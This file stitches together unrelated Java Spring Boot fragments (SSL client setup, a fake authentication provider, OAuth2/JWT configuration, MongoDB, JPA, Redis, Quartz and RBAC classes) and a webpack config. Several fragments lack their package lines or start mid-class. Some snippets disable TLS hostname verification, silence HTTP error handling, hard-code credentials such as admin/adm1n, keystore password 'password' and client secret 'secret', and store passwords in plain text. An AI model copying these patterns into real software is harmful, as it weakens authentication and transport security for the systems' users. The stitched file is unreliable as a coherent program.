import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.web.client.DefaultResponseErrorHandler;
import org.springframework.web.client.RestTemplate;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

import javax.net.ssl.SSLContext;

@SpringBootApplication
@EnableSwagger2
public class ServerApplication {
    @Value("${server.ssl.trust-store-password}")
    private String trustStorePassword;
    @Value("${server.ssl.trust-store}")
    private Resource trustResource;
    @Value("${server.ssl.key-store-password}")
    private String keyStorePassword;
    @Value("${server.ssl.key-password}")
    private String keyPassword;
    @Value("${server.ssl.key-store}")
    private Resource keyStore;

    public static void main(String[] args) {
        SpringApplication.run(ServerApplication.class, args);
    }

    @Bean
    public Docket api() {
        return new Docket(DocumentationType.SWAGGER_2)
                .select()
                .apis(RequestHandlerSelectors.any())
                .paths(PathSelectors.any())
                .build();
    }

    @Bean
    public RestTemplate restTemplate() throws Exception {
        RestTemplate restTemplate = new RestTemplate(clientHttpRequestFactory());
        restTemplate.setErrorHandler(
                new DefaultResponseErrorHandler() {
                    @Override
                    protected boolean hasError(HttpStatus statusCode) {
                        return false;
                    }
                });

        return restTemplate;
    }

    private ClientHttpRequestFactory clientHttpRequestFactory() throws Exception {
        return new HttpComponentsClientHttpRequestFactory(httpClient());
    }

    private HttpClient httpClient() throws Exception {
        // Load our keystore and truststore containing certificates that we trust.
        SSLContext sslcontext =
                SSLContexts.custom().loadTrustMaterial(trustResource.getFile(), trustStorePassword.toCharArray())
                        .loadKeyMaterial(keyStore.getFile(), keyStorePassword.toCharArray(),
                                keyPassword.toCharArray()).build();
        SSLConnectionSocketFactory sslConnectionSocketFactory =
                new SSLConnectionSocketFactory(sslcontext, new NoopHostnameVerifier());
        return HttpClients.custom().setSSLSocketFactory(sslConnectionSocketFactory).build();
    }
}
----------------------------------------------------------------------------------------
public class ClientHttpRequestFactorySupplier implements Supplier<ClientHttpRequestFactory> {

	private static final Map<String, String> REQUEST_FACTORY_CANDIDATES;

	static {
		Map<String, String> candidates = new LinkedHashMap<>();
		candidates.put("org.apache.http.client.HttpClient",
				"org.springframework.http.client.HttpComponentsClientHttpRequestFactory");
		candidates.put("okhttp3.OkHttpClient", "org.springframework.http.client.OkHttp3ClientHttpRequestFactory");
		REQUEST_FACTORY_CANDIDATES = Collections.unmodifiableMap(candidates);
	}

	@Override
	public ClientHttpRequestFactory get() {
		for (Map.Entry<String, String> candidate : REQUEST_FACTORY_CANDIDATES.entrySet()) {
			ClassLoader classLoader = getClass().getClassLoader();
			if (ClassUtils.isPresent(candidate.getKey(), classLoader)) {
				Class<?> factoryClass = ClassUtils.resolveClassName(candidate.getValue(), classLoader);
				return (ClientHttpRequestFactory) BeanUtils.instantiateClass(factoryClass);
			}
		}
		return new SimpleClientHttpRequestFactory();
	}

}
----------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;

import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.crypto.password.NoOpPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

/**
 * In-memory fake authentication provider.
 * 
 * @author Andreas Kluth
 */
@Component
public class FakeAuthenticationProvider implements AuthenticationProvider {

  private static final String HARD_CODED_SUPER_SECRET_NAME = "admin";

  private static final String HARD_CODED_SUPER_SECRET_PW = "adm1n";

  private final String saltedAndHashedSecret;

  private final PasswordEncoder passwordEncoder = NoOpPasswordEncoder.getInstance();

  /**
   * Creates a new instance of {@link FakeAuthenticationProvider}.
   * 
   * @param encoder
   *          to hash and salt passwords.
   */
  public FakeAuthenticationProvider() {
    saltedAndHashedSecret = passwordEncoder.encode(HARD_CODED_SUPER_SECRET_PW);
  }

  @Override
  public Authentication authenticate(Authentication authentication) throws AuthenticationException {
    String name = authentication.getName();
    String password = authentication.getCredentials().toString();

    if (isValidUser(name, password)) {
      List<GrantedAuthority> grantedAuths = new ArrayList<>();
      grantedAuths.add(new SimpleGrantedAuthority("USER"));
      return new UsernamePasswordAuthenticationToken(name, password, grantedAuths);
    }

    throw new BadCredentialsException("Invalid password or user name.");
  }

  @Override
  public boolean supports(Class<?> authentication) {
    return authentication.equals(UsernamePasswordAuthenticationToken.class);
  }

  private boolean isValidUser(String name, String password) {
    return HARD_CODED_SUPER_SECRET_NAME.equalsIgnoreCase(name)
        && passwordEncoder.matches(password, saltedAndHashedSecret);
  }

}
----------------------------------------------------------------------------------------
import java.math.BigInteger;
import java.util.ArrayList;
import java.util.List;

// tag::slimmed[]
import org.springframework.data.annotation.Id;
import org.springframework.data.mongodb.core.mapping.DBRef;
import org.springframework.data.mongodb.core.mapping.Document;

@Document()
public class Team {

	@Id
	private BigInteger id;

	private String name;

	@DBRef
	private List<Teammate> members;
// end::slimmed[]

	private Team() {
		members = new ArrayList<>();
	}

	public Team(String name) {
		this();
		this.name = name;
	}

	public BigInteger getId() {
		return id;
	}

	public String getName() {
		return name;
	}

	public void setName(String name) {
		this.name = name;
	}

	public List<Teammate> getMembers() {
		return members;
	}

	public void setMembers(List<Teammate> members) {
		this.members = members;
	}
}

import org.apache.catalina.connector.Connector;
import org.apache.coyote.http11.Http11NioProtocol;
import org.springframework.boot.context.embedded.EmbeddedServletContainerFactory;
import org.springframework.boot.context.embedded.tomcat.TomcatEmbeddedServletContainerFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.util.ResourceUtils;

import java.io.FileNotFoundException;

@Configuration
public class SecureTomcatConfiguration {

	@Bean
	public EmbeddedServletContainerFactory servletContainer()
			throws FileNotFoundException {
		TomcatEmbeddedServletContainerFactory f =
				new TomcatEmbeddedServletContainerFactory();
		f.addAdditionalTomcatConnectors(createSslConnector());
		return f;
	}

	private Connector createSslConnector() throws FileNotFoundException {
		Connector connector = new Connector(Http11NioProtocol.class.getName());
		Http11NioProtocol protocol =
				(Http11NioProtocol)connector.getProtocolHandler();
		connector.setPort(8443);
		connector.setSecure(true);
		connector.setScheme("https");
		protocol.setSSLEnabled(true);
		protocol.setKeyAlias("learningspringboot");
		protocol.setKeystorePass("password");
		protocol.setKeystoreFile(ResourceUtils
			.getFile("src/main/resources/tomcat.keystore")
			.getAbsolutePath());
		protocol.setSslProtocol("TLS");
		return connector;
	}

}
----------------------------------------------------------------------------------------
import org.springframework.hateoas.ResourceSupport;

import java.time.LocalDateTime;

public class BananaResource extends ResourceSupport {
  public LocalDateTime pickedAt;
  public Boolean peeled;
}


import com.stelligent.domain.Banana;
import org.springframework.hateoas.mvc.ResourceAssemblerSupport;
import org.springframework.stereotype.Component;

import java.util.Objects;

/**
 * A ResourceAssembler to convert a Banana domain object into a HATEOAS Resource (with links)
 */
@Component
public class BananaResourceAssembler extends ResourceAssemblerSupport<Banana, BananaResource> {
  public BananaResourceAssembler() {
    super(BananaController.class, BananaResource.class);
  }

  /**
   * Convert a Banana into a BananaResource and add links to the resource
   *
   * @param banana The Banana domain object
   * @return A BananaResource representation of the Banana
   * @throws NullPointerException if banana is null
   */
  public BananaResource toResource(Banana banana) throws NullPointerException {
    if(Objects.isNull(banana)) {
      throw new NullPointerException();
    }

    BananaResource bananaResource = createResourceWithId(banana.getId(), banana); // adds a "self" link
    bananaResource.pickedAt = banana.getPickedAt();
    bananaResource.peeled = banana.getPeeled();
    return bananaResource;
  }
}

import com.stelligent.domain.Banana;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.InjectMocks;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.hateoas.Link;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import java.time.LocalDateTime;
import java.util.List;

import static org.mockito.MockitoAnnotations.initMocks;

@RunWith(SpringRunner.class)
@SpringBootTest()
public class BananaResourceAssemblerTest {
  @Autowired
  private WebApplicationContext context;

  private MockMvc mockMvc;

  @InjectMocks
  private BananaResourceAssembler bananaResourceAssembler;

  @Before
  public void setUp() {

    initMocks(this);
    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.context).build();
  }

  @Test(expected = NullPointerException.class)
  public void testToResourceWithNull() {
    bananaResourceAssembler.toResource(null);
  }

  @Test
  public void testToResource() {
    Banana banana = new Banana();
    banana.setId(100L);
    banana.setPeeled(true);
    banana.setPickedAt(LocalDateTime.now());
    BananaResource bananaResource = bananaResourceAssembler.toResource(banana);

    Assert.assertEquals("peeled",banana.getPeeled(), bananaResource.peeled);
    Assert.assertEquals("picked at",banana.getPickedAt(), bananaResource.pickedAt);

    List<Link> links = bananaResource.getLinks();
    Assert.assertEquals("links size",1,links.size());
    Assert.assertEquals("links rel","self",links.get(0).getRel());
    Assert.assertEquals("links href","http://localhost/bananas/100",links.get(0).getHref());
  }
}

import org.springframework.hateoas.Identifiable;
import java.time.LocalDateTime;

/**
 * Domain model representing the Milkshake object
 */
public class Milkshake implements Identifiable<Long>{
  private Long id;
  private Flavor flavor;

  public enum Flavor {
    Banana
  }

  public Long getId() {
    return id;
  }

  public void setId(Long id) {
    this.id = id;
  }

  public Flavor getFlavor() {
    return flavor;
  }

  public void setFlavor(Flavor flavor) {
    this.flavor = flavor;
  }

  @Override
  public boolean equals(Object o) {
    if (this == o) return true;
    if (o == null || getClass() != o.getClass()) return false;

    Milkshake milkshake = (Milkshake) o;

    return id != null ? id.equals(milkshake.id) : milkshake.id == null;

  }

  @Override
  public int hashCode() {
    return id != null ? id.hashCode() : 0;
  }
}

/**
 * Created by luotuo on 17-6-7.
 */
public class Constant {
    public enum ResourceType {
        PROJECT("project"),
        TASK("task"),
        REPORT("report");

        public String getTypeName() {
            return typeName;
        }

        private String typeName;
        ResourceType(String typeName) {
            this.typeName = typeName;
        }
    }

    public enum ControllerType {
        GET("get"),
        EDIT("edit"),
        DELETE("delete"),
        ADD("add");

        public String getTypeName() {
            return typeName;
        }

        private String typeName;
        ControllerType(String typeName) { this.typeName = typeName; }
    }

    public enum UserRoleType {
        AUDITMAN("audit_man"),
        AUDITLEADER("audit_leader"),
        PROJECTMANAGER("project_manager"),
        BUSINESSMANAGER("business_manager"),
        REVIEWER("reviewer");
        public String getTypeName() {
            return typeName;
        }

        private String typeName;
        UserRoleType(String typeName) { this.typeName = typeName; }
    }
}

import java.io.IOException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.ResponseHandler;
import org.apache.http.util.EntityUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.jwcq.wechat.utils.JsonUtil;

public class JsonResponseHandler{

	private static Logger logger = LoggerFactory.getLogger(JsonResponseHandler.class);

	public static <T> ResponseHandler<T> createResponseHandler(final Class<T> clazz){
		return new JsonResponseHandlerImpl<T>(null,clazz);
	}

	public static class JsonResponseHandlerImpl<T> extends LocalResponseHandler implements ResponseHandler<T> {
		
		private Class<T> clazz;
		
		public JsonResponseHandlerImpl(String uriId, Class<T> clazz) {
			this.uriId = uriId;
			this.clazz = clazz;
		}

		@Override
		public T handleResponse(HttpResponse response)
				throws ClientProtocolException, IOException {
			int status = response.getStatusLine().getStatusCode();
            if (status >= 200 && status < 300) {
                HttpEntity entity = response.getEntity();
                String str = EntityUtils.toString(entity,"utf-8");
                logger.info("URI[{}] elapsed time:{} ms RESPONSE DATA:{}",super.uriId,System.currentTimeMillis()-super.startTime,str);
                return JsonUtil.parseObject(str, clazz);
            } else {
                throw new ClientProtocolException("Unexpected response status: " + status);
            }
		}
		
	}
}

    @Autowired
    DataSource dataSource;
 
    @Autowired
    private ApplicationContext applicationContext;
     
    @Autowired
    private TriggerListner triggerListner;

    @Autowired
    private JobsListener jobsListener;
    
    /**
     * create scheduler
     */
    @Bean
    public SchedulerFactoryBean schedulerFactoryBean() throws IOException {
 
        SchedulerFactoryBean factory = new SchedulerFactoryBean();
        factory.setOverwriteExistingJobs(true);
        factory.setDataSource(dataSource);
        factory.setQuartzProperties(quartzProperties());
        
        //Register listeners to get notification on Trigger misfire etc
        factory.setGlobalTriggerListeners(triggerListner);
        factory.setGlobalJobListeners(jobsListener);
        
        AutowiringSpringBeanJobFactory jobFactory = new AutowiringSpringBeanJobFactory();
        jobFactory.setApplicationContext(applicationContext);
        factory.setJobFactory(jobFactory);
        
        return factory;
    }
 
    /**
     * Configure quartz using properties file
     */
    @Bean
    public Properties quartzProperties() throws IOException {
        PropertiesFactoryBean propertiesFactoryBean = new PropertiesFactoryBean();
        propertiesFactoryBean.setLocation(new ClassPathResource("/quartz.properties"));
        propertiesFactoryBean.afterPropertiesSet();
        return propertiesFactoryBean.getObject();
    }
----------------------------------------------------------------------------------------
var path = require('path');
var webpack = require('webpack');
var HtmlWebpackPlugin = require('html-webpack-plugin');
var CopyWebpackPlugin = require('copy-webpack-plugin');
var ExtractTextPlugin = require('extract-text-webpack-plugin');

module.exports = {

  entry: {
    'app': './src/main.ts',
    'polyfills': [
      'core-js/es6',
      'core-js/es7/reflect',
      'zone.js/dist/zone'
    ]
  },
  output: {
    path: './target',
    filename: '[name].bundle.js'
  },
  module: {
    loaders: [
      {test: /\.component.ts$/, loader: 'ts!angular2-template'},
      {test: /\.ts$/, exclude: /\.component.ts$/, loader: 'ts'},
      {test: /\.html$/, loader: 'raw'},
      {test: /\.css$/, include: path.resolve('src/resources/vendor'), loader: 'raw'},
      {test: /\.css$/, include: path.resolve('src/resources/vendor'), loader: ExtractTextPlugin.extract('style', 'css')},
	  {test: /\.css$/, include: path.resolve('node_modules'), loader: ExtractTextPlugin.extract('style', 'css')},
      {test: /\.(png|jpe?g|gif|svg|woff|woff2|ttf|eot|ico)$/, loader: 'file?name=fonts/[name].[ext]'}
    ]
  },
  resolve: {
    extensions: ['', '.js', '.ts', '.html', '.css']
  },
  devServer: {
    proxy: {
      "**": "http://localhost:7080"
    }
  },
  plugins: [
    new webpack.optimize.CommonsChunkPlugin({
      name: 'polyfills'
    }),
    new HtmlWebpackPlugin({
      template: './src/index.html'
    }),
    new webpack.DefinePlugin({
      app: {
        environment: JSON.stringify(process.env.APP_ENVIRONMENT || 'development')
      }
    }),
    new ExtractTextPlugin('[name].css'),
	new webpack.ProvidePlugin({
		$: 'jquery',
		jquery: 'jquery',
		jQuery: 'jquery'
    })
  ]
};
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.view.tiles3.TilesConfigurer;

/**
 * Unit tests were failing because could not locate tiles.xml, so swap out the configurer with
 * one that knows the relative location of the file.
 * 
 * @author Mark Meany
 */
@Configuration
public class TestConfigurtaion {

    /**
     * Configure tiles using a filesystem location for the configuration file rather than a
     * URL based location.
     * 
     * @return tiles configurer
     */
	@Bean
	public TilesConfigurer tilesConfigurer() {
		TilesConfigurer configurer = new TilesConfigurer();
		configurer.setDefinitions(new String[] { "file:src/main/webapp/WEB-INF/tiles/tiles.xml" });
		configurer.setCheckRefresh(true);
		return configurer;
	}
}

import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Set;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ClassPathResource;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.authentication.configurers.GlobalAuthenticationConfigurerAdapter;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.oauth2.common.DefaultOAuth2AccessToken;
import org.springframework.security.oauth2.common.OAuth2AccessToken;
import org.springframework.security.oauth2.config.annotation.configurers.ClientDetailsServiceConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configuration.AuthorizationServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableAuthorizationServer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerSecurityConfigurer;
import org.springframework.security.oauth2.provider.OAuth2Authentication;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;
import org.springframework.security.oauth2.provider.token.store.KeyStoreKeyFactory;

import com.kristijangeorgiev.spring.boot.oauth2.jwt.model.entity.User;

@Configuration
@EnableAuthorizationServer
public class OAuth2Configuration extends AuthorizationServerConfigurerAdapter {

	@Autowired
	@Qualifier("authenticationManagerBean")
	private AuthenticationManager authenticationManager;

	// TODO externalize token related data to configuration, store clients in DB
	@Override
	public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
		clients.inMemory().withClient("webapp").authorizedGrantTypes("implicit", "refresh_token", "password")
				.authorities("ROLE_TRUSTED").resourceIds("ms/user").scopes("read", "write").autoApprove(true)
				.accessTokenValiditySeconds(60000).refreshTokenValiditySeconds(60000).and().withClient("server")
				.secret("secret").authorizedGrantTypes("refresh_token", "authorization_code")
				.authorities("ROLE_TRUSTED").resourceIds("app/admin").scopes("read", "write").autoApprove(true);
	}

	/*
	 * The endpoints can only be accessed by a not logged in user or a user with
	 * the specified role
	 */
	// TODO externalise configuration
	@Override
	public void configure(AuthorizationServerSecurityConfigurer oauthServer) throws Exception {
		oauthServer.tokenKeyAccess("isAnonymous() || hasAuthority('ROLE_TRUSTED')")
				.checkTokenAccess("hasAuthority('ROLE_TRUSTED')");
	}

	@Override
	public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {
		endpoints.tokenStore(tokenStore()).tokenEnhancer(jwtAccessTokenConverter())
				.authenticationManager(authenticationManager);
	}

	@Bean
	public TokenStore tokenStore() {
		return new JwtTokenStore(jwtAccessTokenConverter());
	}

	// TODO encrypt password
	@Bean
	protected JwtAccessTokenConverter jwtAccessTokenConverter() {
		JwtAccessTokenConverter converter = new CustomTokenEnhancer();
		converter.setKeyPair(
				new KeyStoreKeyFactory(new ClassPathResource("jwt.jks"), "password".toCharArray()).getKeyPair("jwt"));
		return converter;
	}

	/*
	 * Add custom user principal information to the JWT token
	 */
	// TODO additional information fields should be get from configuration
	protected static class CustomTokenEnhancer extends JwtAccessTokenConverter {
		@Override
		public OAuth2AccessToken enhance(OAuth2AccessToken accessToken, OAuth2Authentication authentication) {
			User user = (User) authentication.getPrincipal();

			Map<String, Object> info = new LinkedHashMap<String, Object>(accessToken.getAdditionalInformation());

			info.put("email", user.getEmail());

			DefaultOAuth2AccessToken customAccessToken = new DefaultOAuth2AccessToken(accessToken);

			// Get the authorities from the user
			Set<GrantedAuthority> authoritiesSet = new HashSet<>(authentication.getAuthorities());

			// Generate String array
			String[] authorities = new String[authoritiesSet.size()];

			int i = 0;
			for (GrantedAuthority authority : authoritiesSet)
				authorities[i++] = authority.getAuthority();

			info.put("authorities", authorities);
			customAccessToken.setAdditionalInformation(info);

			return super.enhance(customAccessToken, authentication);
		}
	}

	/*
	 * Setup the refresh_token functionality to work with the custom
	 * UserDetailsService
	 */
	@Configuration
	protected static class GlobalAuthenticationManagerConfiguration extends GlobalAuthenticationConfigurerAdapter {
		@Autowired
		private UserDetailsService userDetailsService;

		@Autowired
		private PasswordEncoder passwordEncoder;

		@Override
		public void init(AuthenticationManagerBuilder auth) throws Exception {
			auth.userDetailsService(userDetailsService).passwordEncoder(passwordEncoder);
		}
	}
}
----------------------------------------------------------------------------------------
import java.util.List;

import javax.persistence.CascadeType;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.JoinColumn;
import javax.persistence.JoinTable;
import javax.persistence.ManyToMany;
import javax.validation.constraints.NotNull;
import javax.validation.constraints.Size;

import org.hibernate.annotations.Where;
import org.hibernate.annotations.WhereJoinTable;

import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;

/**
 * 
 * <h2>Role</h2>
 * 
 * @author Kristijan Georgiev
 * 
 *         Role entity
 *
 */

@Entity
@Setter
@Getter
@NoArgsConstructor
public class Role extends BaseIdEntity {

	private static final long serialVersionUID = 1L;

	@NotNull
	@Size(min = 6, max = 60)
	private String name;

	/*
	 * Get all permissions associated with the Role that are not deleted
	 */
	@ManyToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)
	@JoinTable(name = "permission_role", joinColumns = {
			@JoinColumn(name = "role_id", referencedColumnName = "id") }, inverseJoinColumns = {
					@JoinColumn(name = "permission_id", referencedColumnName = "id") })
	@WhereJoinTable(clause = NOT_DELETED)
	@Where(clause = NOT_DELETED)
	private List<Permission> permissions;

}

import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;

import com.kristijangeorgiev.spring.boot.oauth2.jwt.model.entity.User;

/**
 * 
 * @author Kristijan Georgiev
 * 
 *         UserRepository with custom methods for finding an active User by
 *         username or email
 *
 */

@Repository
@Transactional
public interface UserRepository extends JpaRepository<User, Long> {

	@Query("SELECT u FROM User u WHERE (u.deletedOn > CURRENT_TIMESTAMP OR u.deletedOn IS NULL) AND u.username = :username")
	User findActiveByUsername(@Param("username") String username);

	@Query("SELECT u FROM User u WHERE (u.deletedOn > CURRENT_TIMESTAMP OR u.deletedOn IS NULL) AND u.email = :email")
	User findActiveByEmail(@Param("email") String email);

}

import com.km.entity.Info;
import com.km.entity.User;
import com.km.service.UserService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.cache.annotation.CacheEvict;
import org.springframework.cache.annotation.CachePut;
import org.springframework.cache.annotation.Cacheable;
import org.springframework.stereotype.Service;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * <p></p>
 * Created by zhezhiyong@163.com on 2017/9/21.
 */
@Service
@Slf4j
public class UserServiceImpl implements UserService {

    private Map<Long, User> userMap = new HashMap<>();
    private Map<Long, Info> infoMap = new HashMap<>();

    public UserServiceImpl() {
        userMap.put(1L, new User(1L, "aaa", "666666"));
        userMap.put(2L, new User(2L, "bbb", "666666"));
        userMap.put(3L, new User(3L, "ccc", "666666"));
        infoMap.put(1L, new Info("18559198715", "福州市"));
    }

    @Override
    public List list() {
        return Arrays.asList(userMap.values().toArray());
    }

    @Override
    @Cacheable(value = "user", key = "'user'.concat(#id.toString())")
    public User findUserById(Long id) {
        log.info("findUserById query from db, id: {}", id);
        return userMap.get(id);
    }

    @Override
    @Cacheable(value = "info", key = "'info'.concat(#id.toString())")
    public User findInfoById(Long id) {
        log.info("findInfoById query from db, id: {}", id);
        return userMap.get(id);
    }

    @Override
    @CachePut(value = "user", key = "'user'.concat(#user.id.toString())")
    public void update(User user) {
        log.info("update db, user: {}", user.toString());
        userMap.put(user.getId(), user);
    }

    @Override
    @CacheEvict(value = "user", key = "'user'.concat(#id.toString())")
    public void remove(Long id) {
        log.info("remove from db, id: {}", id);
        userMap.remove(id);
    }
}
----------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;

import redis.clients.jedis.JedisPool;
import redis.clients.jedis.JedisPoolConfig;

import com.butterfly.redis.generator.client.JedisClient;
import com.butterfly.redis.generator.properties.JedisProperties;
import com.google.common.base.Strings;

/**
 * @Description
 * @author butterfly
 * @date 2017年8月3日 下午1:51:16
 */
@Configuration  
@PropertySource(value = "classpath:jedis.properties")
@EnableConfigurationProperties(JedisProperties.class)// 开启属性注入,通过@autowired注入   
@ConditionalOnClass(JedisClient.class) // 判断这个类是否在classpath中存在  
public class JedisSpringConfig {
	
	/**
	 * 属性配置对象
	 */
	@Autowired
	private JedisProperties prop;

	
	/**
	 * @Description 
	 * 
	 * @author butterfly
	 * @return
	 */
	@Bean(name = "jedisPool")
	public JedisPool jedisPool() {
		JedisPoolConfig config = new JedisPoolConfig();
		config.setMaxTotal(prop.getMaxTotal());
		config.setMaxIdle(prop.getMaxIdle());
		config.setMaxWaitMillis(prop.getMaxWait());
		config.setTestOnBorrow(prop.getTestOnBorrow());
		JedisPool jedisPool = null;
		if (!Strings.isNullOrEmpty(prop.getPassword())) {
			jedisPool = new JedisPool(config, prop.getHost(), prop.getPort(), prop.getTimeout(), prop.getPassword());
		} else {
			jedisPool = new JedisPool(config, prop.getHost(), prop.getPort(), prop.getTimeout());
		}
		return jedisPool;
	}

	
	/**
	 * @Description 
	 * 
	 * @author butterfly
	 * @param pool
	 * @return
	 */
	@Bean
	@ConditionalOnMissingBean(JedisClient.class) // 容器中如果没有RedisClient这个类,那么自动配置这个RedisClient
	public JedisClient redisClient(@Qualifier("jedisPool") JedisPool pool) {
		JedisClient jedisClient = new JedisClient();
		jedisClient.setJedisPool(pool);
		return jedisClient;
	}
}

 @PreAuthorize("isAuthenticated() && hasPermission(#user, 'WRITE') && #user != null")
----------------------------------------------------------------------------------------
package com.synerzip.template.springboot;

import cucumber.api.CucumberOptions;
import cucumber.api.junit.Cucumber;
import org.junit.runner.RunWith;

/**
 * @author rohitghatol
 *
 */
@RunWith(Cucumber.class)
@CucumberOptions(format={"pretty",
		  "html:target/test-report",
			"json:target/test-report.json",
			"junit:target/test-report.xml"})
public class RunCukesTest {
}
----------------------------------------------------------------------------------------
import org.springframework.security.core.GrantedAuthority;

/**
 * 系统内置角色
 */
public enum SysRole implements GrantedAuthority {

	// 系统 - 普通用户
	ROLE_USER("普通用户") {
		@Override
		public String getAuthority() {
			return "ROLE_USER";
		}
	},
	// 系统 - 管理员
	ROLE_MGR("管理员") {
		@Override
		public String getAuthority() {
			return "ROLE_MGR";
		}
	},
	// 系统 - 超级管理员
	ROLE_ADMIN("超级管理员") {
		@Override
		public String getAuthority() {
			return "ROLE_ADMIN";
		}
	};

	private final String displayName;

	SysRole(String value) {
		displayName = value;
	}

	public String getCode() {
		return name();
	}

	public String getDisplayName() {
		return displayName;
	}

}
----------------------------------------------------------------------------------------
import in.clouthink.daas.sbb.account.domain.model.SysRole;
import in.clouthink.daas.sbb.rbac.model.Resource;
import in.clouthink.daas.sbb.rbac.service.PermissionService;
import in.clouthink.daas.sbb.rbac.service.ResourceService;
import in.clouthink.daas.sbb.rbac.support.matcher.ResourceMatchers;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.web.FilterInvocation;
import org.springframework.security.web.access.expression.WebSecurityExpressionRoot;

import java.util.Collection;

/**
 */
public class RbacWebSecurityExpressionRoot extends WebSecurityExpressionRoot {

	private FilterInvocation filterInvocation;

	private PermissionService permissionService;

	private ResourceService resourceService;

	public RbacWebSecurityExpressionRoot(Authentication a,
										 FilterInvocation fi,
										 PermissionService permissionService,
										 ResourceService resourceService) {
		super(a, fi);
		this.filterInvocation = fi;
		this.permissionService = permissionService;
		this.resourceService = resourceService;
	}

	public boolean isPassRbacCheck() {
		Collection<? extends GrantedAuthority> authorities = extractAuthorities(authentication);
		//no permission if the request is not from system role user
		if (!authorities.contains(SysRole.ROLE_USER)) {
			return false;
		}
		//the admin role will get the permission automatically
		if (authorities.contains(SysRole.ROLE_ADMIN)) {
			return true;
		}

		// Attempt to find a matching granted authority
		String requestUrl = filterInvocation.getRequestUrl();
		Resource resource = resourceService.getFirstMatchedResource(ResourceMatchers.matchAntPath(requestUrl));
		if (resource != null) {
			for (GrantedAuthority authority : authorities) {
				if (permissionService.isGranted(resource.getCode(), authority)) {
					return true;
				}
			}
		}

		return false;
	}

	Collection<? extends GrantedAuthority> extractAuthorities(Authentication authentication) {
		return authentication.getAuthorities();
	}

}


import in.clouthink.daas.sbb.rbac.service.PermissionService;
import in.clouthink.daas.sbb.rbac.service.ResourceService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.access.expression.SecurityExpressionOperations;
import org.springframework.security.core.Authentication;
import org.springframework.security.web.FilterInvocation;
import org.springframework.security.web.access.expression.DefaultWebSecurityExpressionHandler;

/**
 * How to configure
 * <p>
 * http.authorizeRequests()
 * .accessDecisionManager(accessDecisionManager())
 * .antMatchers("put the wanted url here")
 * .access("passRbacCheck")
 * <p>
 */
public class RbacWebSecurityExpressionHandler extends DefaultWebSecurityExpressionHandler {

	@Autowired
	private PermissionService permissionService;

	@Autowired
	private ResourceService resourceService;

	@Override
	public SecurityExpressionOperations createSecurityExpressionRoot(Authentication authentication,
																	 FilterInvocation fi) {
		RbacWebSecurityExpressionRoot root = new RbacWebSecurityExpressionRoot(authentication,
																			   fi,
																			   permissionService,
																			   resourceService);
		root.setPermissionEvaluator(getPermissionEvaluator());
		root.setRoleHierarchy(getRoleHierarchy());
		return root;
	}

}

	@JsonDeserialize(contentAs = PrivilegedResourceWithChildren.class)
	public List<PrivilegedResourceWithChildren> getChildren() {
		return children;
	}
----------------------------------------------------------------------------------------
